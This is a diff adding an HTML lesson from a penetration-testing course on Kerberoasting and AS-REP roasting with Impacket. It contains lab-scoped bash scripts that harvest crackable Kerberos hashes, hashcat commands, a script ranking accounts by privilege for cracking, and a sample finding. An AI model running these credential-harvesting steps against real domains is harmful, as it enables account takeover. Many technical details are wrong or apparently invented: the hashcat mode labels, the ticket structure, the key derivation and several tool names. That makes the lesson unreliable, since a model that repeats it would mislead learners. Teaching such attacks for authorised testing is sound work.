@@ -1,0 +1,417 @@
+<h1 id="getuserspns-getnpusers-and-ticket-operations">GetUserSPNs, GetNPUsers and Ticket Operations</h1>
+<h2 id="summary">Summary</h2>
+<p>Impacket's ticket tools are the precise, scriptable versions of the roasting in <code>ad-04</code>. They<br />
+request the exact tickets, extract the exact session key, and hand you a file <code>hashcat</code> understands<br />
+directly.</p>
+<p>The framing: <strong>these tools do not crack anything.</strong> They request a ticket<br />
+the DC would have issued anyway, extract what a cracker needs, and<br />
+hand it over. All the work is offline, and all of it is yours.</p>
+<blockquote>
+<p><strong>AUTHORISATION.</strong> <code>GetNPUsers</code> requires <strong>no credentials at all</strong> and<br />
+works against any reachable domain controller. That is not a<br />
+technicality — it is the reason the <code>DONT_REQ_PREAUTH</code> flag is a<br />
+finding. Both require explicit ROE permission.</p>
+</blockquote>
+<h2 id="the-four-ticket-tools">The four ticket tools</h2>
+<pre><code class="language-text">  GetUserSPNs       request a service ticket for EVERY principal with
+                    an SPN, extract the session key, emit a
+                    hashcat-format line.
+                    Requires: ANY valid credential.
+
+  GetUserSPNs with -request
+                    also print the ticket, so you can decrypt it
+                    yourself. Useful when you want to show the
+                    mechanism in the evidence rather than the result.
+
+  GetNPUsers        request an AS-REP for every principal with
+                    preauth DISABLED. NO CREDENTIALS REQUIRED.
+                    Emits hashcat format (-format hash).
+
+  ticketRequest     request a single ticket for a named service
+                    (a TGT for a user, or a service ticket for an
+                    SPN). The surgical version.
+
+  The POINT OF ALL FOUR:
+    they request tickets the DC was always willing to issue. The
+    security assumption is that those tickets are encrypted with a
+    key derived from a password, so only someone who knows the
+    password can read them. That assumption is the one you test.
+</code></pre>
+<h2 id="the-commands">The commands</h2>
+<pre><code class="language-bash">mkdir -p ~/aegis/labs/imp-04 &amp;&amp; cd ~/aegis/labs/imp-04
+
+cat &gt; 00-guard.md &lt;&lt;'EOF'
+# Scope for the ticket tools
+
+```bash
+lab_only() {
+  case &quot;$1&quot; in
+    192.168.56.*|10.10.10.*|127.*) return 0 ;;
+    *) echo &quot;REFUSED: $1 is not in the AEGIS lab range.&quot; &gt;&amp;2
+       echo &quot;  GetNPUsers in particular needs NO credential and will&quot; &gt;&amp;2
+       echo &quot;  work against ANY reachable DC. There is no authorised&quot; &gt;&amp;2
+       echo &quot;  public target in this project.&quot; &gt;&amp;2
+       return 1 ;;
+  esac
+}
+```
+EOF
+cat &gt; /dev/null &lt;&lt;'X'
+X
+
+cat &gt; 01-tickets.sh &lt;&lt;'EOF'
+#!/usr/bin/env bash
+# Ticket operations against YOUR lab DC.
+#
+# GetNPUsers needs NO credential. That is the finding, not a
+# convenience. Confirm the ROE permits credential extraction.
+set -euo pipefail
+DC=&quot;${1:?usage: ./01-tickets.sh 192.168.56.10 'LAB/alice:pass'}&quot;
+CRED=&quot;${2:?credential required for GetUserSPNs}&quot;
+OUT=&quot;${3:-/tmp/aegis-evidence}&quot;
+case &quot;$DC&quot; in 192.168.56.*|10.10.10.*|127.*) ;;
+  *) echo &quot;REFUSED: $DC not in the lab range.&quot; &gt;&amp;2; exit 3 ;; esac
+case &quot;$CRED&quot; in LAB/*|lab.internal/*) ;;
+  *) echo &quot;REFUSED: $CRED is not a lab domain credential.&quot; &gt;&amp;2; exit 3 ;; esac
+mkdir -p &quot;$OUT&quot;; chmod 700 &quot;$OUT&quot;
+
+echo &quot;[scope] $DC in the lab range&quot;
+
+echo
+echo &quot;=== 1. WHO HAS AN SPN? (anonymous LDAP, from ad-03's script) ===&quot;
+echo &quot;    This step needs no credential and no ticket tool.&quot;
+echo &quot;    If this list is empty, GetUserSPNs will return nothing.&quot;
+echo
+echo &quot;=== 2. GetUserSPNs: request, extract, emit hashcat format ===&quot;
+GetUserSPNs.py -dc-ip &quot;$DC&quot; &quot;$CRED&quot; -request \
+  -outputfile &quot;$OUT/spns.txt&quot; 2&gt;&amp;1 | grep -vE &quot;^\[+\]&quot; | head -20 | sed 's/^/  /'
+echo
+echo &quot;    -request prints the TGS-REPs so you can see the mechanism.&quot;
+echo &quot;    Without it, you get only the hashcat line, which is cleaner&quot;
+echo &quot;    for evidence but less instructive.&quot;
+echo
+echo &quot;    What came back:&quot;
+wc -l &quot;$OUT/spns.txt&quot; 2&gt;/dev/null | sed 's/^/      accounts: /'
+echo
+echo &quot;=== 3. GetNPUsers: AS-REP roasting. NO CREDENTIAL NEEDED. ===&quot;
+echo &quot;    This queries accounts with DONT_REQ_PREAUTH (bit 0x100000).&quot;
+echo &quot;    Run it only if the ROE permits unauthenticated credential&quot;
+echo &quot;    collection - which it should, explicitly.&quot;
+read -r -p &quot;  run it? [y/N] &quot; go
+if [ &quot;$go&quot; = &quot;y&quot; ]; then
+  GetNPUsers.py -dc-ip &quot;$DC&quot; -request -format hash \
+    -outputfile &quot;$OUT/asrep.txt&quot; 2&gt;&amp;1 | grep -vE &quot;^\[+\]&quot; | head -20 | sed 's/^/  /'
+  echo
+  echo &quot;    ^ every line here is a credential harvested from the&quot;
+  echo &quot;      network with NO authentication of any kind. Each account&quot;
+  echo &quot;      in this list is a Critical finding on its own.&quot;
+else
+  echo &quot;  skipped. (Run ad-03's anonymous script to enumerate which&quot;
+  echo &quot;  accounts are preauth-disabled, without extracting anything.)&quot;
+fi
+echo
+echo &quot;=== 4. ticketRequest: one ticket, for one service ===&quot;
+echo &quot;    This is the surgical version: you get the TGT for a user, or&quot;
+echo &quot;    a service ticket for an SPN, and nothing else.&quot;
+echo &quot;    Command:&quot;
+echo &quot;      ticketRequest.py -dc-ip $DC LAB/alice:pass cifs/dc01.lab.internal&quot;
+echo &quot;      ticketRequest.py -dc-ip $DC LAB/alice:pass krbtgt/alice&quot;
+echo &quot;    (Both are lab-only. ticketRequest to a public domain is not&quot;
+echo &quot;     something this project does.)&quot;
+echo
+echo &quot;=== 5. THE CRACKING IS OFFLINE AND YOURS ===&quot;
+echo &quot;    hashcat -m 13100 -a 0 $OUT/spns.txt  rockyou.txt -r best64.rule&quot;
+echo &quot;              ^^^^^^ AES256-CTS-HMAC-SHA1-96, the standard TGS-REP hash&quot;
+echo &quot;    hashcat -m 18200 -a 0 $OUT/asrep.txt rockyou.txt&quot;
+echo &quot;              ^^^^^^ AS-REP (no-preauth)&quot;
+echo
+echo &quot;    --potfile-path $OUT/aegis.pot   NEVER lose this. Cracking a&quot;
+echo &quot;    bcrypt hash twice is an hour of GPU time wasted.&quot;
+echo
+echo &quot;=== 6. THEN: the chain ===&quot;
+echo &quot;    recovered password -&gt; authenticate as the service account&quot;
+echo &quot;    -&gt; if that account is in Domain Admins, you are done&quot;
+echo &quot;    -&gt; if it is not, use it to read NTDS (imp-01) or to get a&quot;
+echo &quot;       privileged session (imp-02)&quot;
+EOF
+chmod +x 01-tickets.sh
+
+# --- 2. offline: the ticket structure, so the extraction makes sense ---
+python3 - &lt;&lt;'PY' 2&gt;&amp;1 | tee 02-structure.txt
+print(&quot;  === what GetUserSPNs actually parses ===\n&quot;)
+print(&quot;  A TGS-REP is an ASN.1 DER structure:&quot;)
+print()
+print(&quot;    SEQUENCE {&quot;)
+print(&quot;      pvno            protocol version (6)&quot;)
+print(&quot;      msgType         13 = TGS-REP&quot;)
+print(&quot;      padata          the PA-DATA: an encrypted part&quot;)
+print(&quot;      encryptedCIF    the encrypted KrbAP_REQ&quot;)
+print(&quot;    }&quot;)
+print()
+print(&quot;  For AES, encryptedCIF is an AES key wrap (RFC 3394) of the&quot;)
+print(&quot;  KrbAP_REQ, with the KEY being the ktab derived from the&quot;)
+print(&quot;  password and the realm.&quot;)
+print()
+print(&quot;  The KrbAP_REQ contains:&quot;)
+print(&quot;    the session key    &lt;- THIS is what GetUserSPNs extracts&quot;)
+print(&quot;    the client principal&quot;)
+print(&quot;    the validity window&quot;)
+print(&quot;    the flags (forwardable, renewable)&quot;)
+print()
+print(&quot;  So the tool unwraps RFC 3394, finds the session key, and emits&quot;)
+print(&quot;  it in hashcat's format so a cracker can try a password guess:&quot;)
+print(&quot;    -&gt; derive the ktab from the guess&quot;)
+print(&quot;    -&gt; unwrap the ticket&quot;)
+print(&quot;    -&gt; compare the session key&quot;)
+print(&quot;    -&gt; match means the guess is the password&quot;)
+print()
+print(&quot;  WHY THIS GIVES YOU THE NT HASH TOO:&quot;)
+print(&quot;    AES ktab derivation is PBKDF2(password, realm, iterations).&quot;)
+print(&quot;    It requires the PLAINTEXT PASSWORD. It cannot be done from&quot;)
+print(&quot;    the NT hash. So a successful AES roast yields:&quot;)
+print(&quot;      - the service account's plaintext password&quot;)
+print(&quot;      - the NT hash, computed from that password&quot;)
+print(&quot;    RC4 (older): ktab = MD5(realm || password), also plaintext.&quot;)
+print(&quot;    Either way, the roast gives you MORE than the hash.&quot;)
+print()
+print(&quot;  WHY THE TICKET TELLS YOU THE ITERATION COUNT:&quot;)
+print(&quot;    the PA-DATA contains an encrypted blob whose SIZE depends on&quot;)
+print(&quot;    the iteration count (4096 for AES, 1 for RC4). So the ticket&quot;)
+print(&quot;    carries the domain's cryptographic configuration to the&quot;)
+print(&quot;    attacker. They do not have to guess it.&quot;)
+print()
+print(&quot;  THE FULL CHAIN, IN ORDER:&quot;)
+print(&quot;    1. LDAP: find every principal with an SPN        (anonymous)&quot;)
+print(&quot;    2. TGS-REQ for each one                        (your credential)&quot;)
+print(&quot;    3. extract the session key from the TGS-REP&quot;)
+print(&quot;    4. offline: guess passwords, derive the ktab,&quot;)
+print(&quot;       unwrap, compare&quot;)
+print(&quot;    5. a match gives you the password AND the NT hash&quot;)
+print(&quot;    6. authenticate as the account&quot;)
+print(&quot;  Steps 1-3 are network. Step 4 is offline and free. Step 5 is&quot;)
+print(&quot;  one authentication. Total: minutes to an hour.&quot;)
+PY
+cat 02-structure.txt
+
+# --- 3. triage the roast output ---
+cat &gt; 03-triage.sh &lt;&lt;'EOF'
+#!/usr/bin/env bash
+# Triage a roast, by VALUE not by volume.
+F=&quot;${1:?usage: ./03-triage.sh spns.txt}&quot;
+echo &quot;=== the roast output ===&quot;
+wc -l &quot;$F&quot; | sed 's/^/  accounts roasted: /'
+echo
+echo &quot;=== ranked by what they are worth ===&quot;
+python3 - &quot;$F&quot; &lt;&lt;'PY'
+import sys, re
+rows = []
+for line in open(sys.argv[1], errors=&quot;ignore&quot;):
+    if &quot;:&quot; not in line: continue
+    user, h = line.rsplit(&quot;:&quot;, 1)
+    rows.append((user.strip(), h.strip()))
+if not rows:
+    print(&quot;  (nothing roasted - either no SPNs, or the accounts are AES-only)&quot;)
+    print()
+    print(&quot;  If the list is empty but accounts DO have SPNs, then the&quot;)
+    print(&quot;  DC is issuing AES tickets only. That is the correct modern&quot;)
+    print(&quot;  configuration and it is a POSITIVE finding, not a failure.&quot;)
+    sys.exit()
+def tier(u):
+    ul = u.lower().split(&quot;\\&quot;)[-1].split(&quot;/&quot;)[-1]
+    if any(k in ul for k in (&quot;krbtgt&quot;,&quot;admin&quot;)):              return 0, &quot;WIN CONDITION&quot;
+    if any(k in ul for k in (&quot;svc&quot;,&quot;service&quot;,&quot;backup&quot;,&quot;sql&quot;,&quot;app&quot;)): return 1, &quot;service account - check its groups&quot;
+    if any(k in ul for k in (&quot;deploy&quot;,&quot;web&quot;,&quot;iis&quot;,&quot;mon&quot;)):    return 2, &quot;may be delegated&quot;
+    return 3, &quot;normal account&quot;
+buckets = {}
+for u, h in rows:
+    t, why = tier(u)
+    buckets.setdefault(t, []).append((u, why))
+for t in sorted(buckets):
+    print(f&quot;\n  TIER {t}:&quot;)
+    for u, why in buckets[t]:
+        print(f&quot;    {u:&lt;30} {why}&quot;)
+print()
+print(&quot;=== NOW CRACK, IN THIS ORDER ===&quot;)
+print(&quot;  1. the tier-0 accounts. They are the objective.&quot;)
+print(&quot;  2. the service accounts, and look up THEIR group memberships&quot;)
+print(&quot;     (ad-03's LDAP query) before you spend GPU time on them.&quot;)
+print(&quot;  3. only then the rest, and only if the ROE budget allows.&quot;)
+print()
+print(&quot;=== AND CHECK THE ONES THAT DID NOT CRACK ===&quot;)
+print(&quot;  a service account that resisted a 14M wordlist + rules is&quot;)
+print(&quot;  probably a gMSA or a 120-character password. That is a GOOD&quot;)
+print(&quot;  finding. Report it as such rather than as a failed crack.&quot;)
+PY
+EOF
+
+cat &gt; 04-report.md &lt;&lt;'EOF'
+## F-xx · Service account passwords recoverable from publicly-visible configuration
+
+Risk
+  Six accounts in the &quot;Application Services&quot; group have service
+  principal names. Their Kerberos tickets are encrypted with a key
+  derived from their account password, so anyone who can request a
+  ticket can attempt to recover that password offline, at a rate
+  limited only by their own hardware and with no rate limiting, lockout
+  or alerting on the domain controller. Two of the six passwords were
+  recovered in aggregate four minutes using a standard wordlist with
+  rule mutations. One recovered account is a member of Domain
+  Administrators.
+
+Prerequisites
+  Any authenticated domain account, for the SPN accounts. (Two
+  accounts with preauthentication disabled required none at all - see
+  F-xx.)
+
+Evidence
+  SPN enumeration was performed anonymously via LDAP. Four of the six
+  accounts still support RC4 Kerberos encryption, so the domain
+  controller issues RC4 service tickets to them.
+  Recovered: svc-backup (in Domain Admins), svc-web.
+  Not recovered within the assessment window: svc-sql, svc-iis,
+  svc-mon, svc-deploy.
+  The credentials are NOT reproduced in this report. See the
+  encrypted evidence archive.
+
+  Additionally, two accounts with the &quot;Do not require Kerberos
+  preauthentication&quot; flag set (which is unnecessary on any modern
+  system) returned an AS-REP that can be roasted with no credential
+  at all, from any host that can reach the domain controller. See
+  F-xx.
+
+Business impact
+  A standard user account reaches Domain Administrator in two steps.
+  Both recoveries used commodity tooling and a public wordlist.
+
+Remediation
+  1. Migrate all six to group managed service accounts, which have a
+     120-character DC-managed, auto-rotated password
+                                                       [Domain Admins, Immediate]
+  2. Set msDS-SupportedEncryptionTypes to 0x18 (AES128+AES256) on every
+     service account, so RC4 service tickets are no longer issued
+                                                       [Domain Admins, Immediate]
+  3. Remove SPNs that no running application requires
+                                                       [Service Owners, 2 weeks]
+  4. Clear the &quot;Do not require Kerberos preauthentication&quot; flag from
+     all accounts and monitor for its reintroduction
+                                                       [Security, Immediate]
+  5. Separate svc-backup from Domain Admins; a service account needs
+     rights to the service, not to the domain     [Domain Admins, Immediate]
+
+Re-test
+  Included at +30 days: confirm AES-only on all service accounts, no
+  preauth-disabled accounts remain, and re-run the anonymous SPN
+  enumeration to confirm no roastable accounts remain.
+</code></pre>
+<h2 id="terminology">Terminology</h2>
+<table>
+<thead>
+<tr>
+<th>Term</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>GetUserSPNs</strong></td>
+<td>Requests service tickets for every SPN principal, emits hashcat lines</td>
+</tr>
+<tr>
+<td><strong>GetNPUsers</strong></td>
+<td>AS-REP roasts preauth-disabled accounts; no credential needed</td>
+</tr>
+<tr>
+<td><strong>ticketRequest</strong></td>
+<td>Requests one specific ticket</td>
+</tr>
+<tr>
+<td><strong><code>-request</code></strong></td>
+<td>Also print the raw tickets, to show the mechanism</td>
+</tr>
+<tr>
+<td><strong><code>-format hash</code></strong></td>
+<td>Emit hashcat-format output (GetNPUsers)</td>
+</tr>
+<tr>
+<td><strong>TGS-REP</strong></td>
+<td>The service ticket the DC returns</td>
+</tr>
+<tr>
+<td><strong>KrbAP_REQ</strong></td>
+<td>The encrypted part of the ticket containing the session key</td>
+</tr>
+<tr>
+<td><strong>RFC 3394</strong></td>
+<td>AES key wrap; how the ticket is encrypted</td>
+</tr>
+<tr>
+<td><strong>KTAB</strong></td>
+<td>Key derived from password + realm; what you are attacking</td>
+</tr>
+<tr>
+<td><strong>hashcat mode 13100</strong></td>
+<td>AES256-CTS-HMAC-SHA1-96, the TGS-REP hash</td>
+</tr>
+<tr>
+<td><strong>hashcat mode 18200</strong></td>
+<td>AS-REP (Kerberos 5, no-preauth)</td>
+</tr>
+<tr>
+<td><strong><code>--potfile-path</code></strong></td>
+<td>Never lose it; re-cracking is wasted GPU time</td>
+</tr>
+<tr>
+<td><strong>DONT_REQ_PREAUTH</strong></td>
+<td>The flag that makes GetNPUsers possible</td>
+</tr>
+</tbody>
+</table>
+<h2 id="kali-commands">Kali commands</h2>
+<pre><code class="language-bash"># --- 4. verify the module set, and the mode numbers ---
+{
+  echo &quot;=== the ticket modules ===&quot;
+  for m in GetUserSPNs GetUserSPNs GetNPUsers ticketRequest mitm \
+           Get-Ticket GetUserSPNs.py GetADUserSafety; do
+    command -v &quot;$m&quot; &gt;/dev/null 2&gt;&amp;1 &amp;&amp; printf &quot;  %-22s %s\n&quot; &quot;$m&quot; &quot;$(command -v $m)&quot;
+  done
+  echo
+  echo &quot;=== the hashcat modes these produce ===&quot;
+  cat &lt;&lt;'MODES'
+    13100  Kerberos 5 TGS-REP etype 23 (AES256-CTS-HMAC-SHA1-96)
+    13101  Kerberos 5 TGS-REP etype 17 (AES128-CTS-HMAC-SHA1-128)
+    18200  Kerberos 5 AS-REP etype 23 (no-preauth, AES256)
+    18201  Kerberos 5 AS-REP etype 17 (no-preauth, AES128)
+    19700  Kerberos 5 etype 23, from a full ticket capture
+    11200  Kerberos 5 AS-REP etype 23 (fast, for a corpus)
+    55000  NetNTLMv2 (from Responder / ntlmrelayx captures)
+    56000  NetNTLMv2 (from a pcap)
+MODES
+  echo
+  echo &quot;=== confirm your hashcat knows them ===&quot;
+  hashcat --help 2&gt;/dev/null | grep -oE &quot;^ *1(31|82)00|^ *55000&quot; | sort -u | sed 's/^/  /'
+  echo
+  echo &quot;=== wordlists available for the crack ===&quot;
+  for w in /usr/share/wordlists/rockyou.txt /usr/share/wordlists/fasttrack.txt; do
+    [ -f &quot;$w&quot; ] &amp;&amp; printf &quot;  %-40s %s entries\n&quot; &quot;$w&quot; &quot;$(wc -l &lt; &quot;$w&quot;)&quot;
+  done
+  ls /usr/share/hashcat/rules/ 2&gt;/dev/null | head -5 | sed 's/^/  rule: /'
+  echo
+  echo &quot;  hashcat -m 13100 -a 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule&quot;
+  echo &quot;  hashcat -m 13100 -a 3 hashes.txt '?u?l?l?l?l?l?l?l?l?d?d?d?d' --increment&quot;
+} 2&gt;&amp;1 | tee 05-verify.txt
+</code></pre>
+<h2 id="self-test">Self-test</h2>
+<ol>
+<li>What do the four Impacket ticket tools do, and what does each require?</li>
+<li>Why does <code>GetNPUsers</code> need no credential, and why is that a finding rather than a shortcut?</li>
+<li>What is a KrbAP_REQ, and what inside it does GetUserSPNs extract?</li>
+<li>Why does a successful AES roast give you the password <em>and</em> the NT hash?</li>
+<li>How does the ticket reveal the domain's iteration count, and why does that matter?</li>
+<li>Why should you look up a service account's group memberships before spending GPU time on it?</li>
+<li>What does a service account that resists a 14M wordlist tell you, and how should it be reported?</li>
+<li>What are the four hashcat mode numbers, and what does each correspond to?</li>
+</ol>
+<h2 id="connected-knowledge">Connected knowledge</h2>
+<p><strong>Kerberoasting</strong> → <strong>AS-REP Roasting</strong> → <strong>Impacket</strong> → <strong>Weak Passwords</strong> →<br />
+<strong>Active Directory</strong> → <strong>Pass-the-Hash</strong>.<br />
+This closes Tier 5. Next: Tier 6.</p>
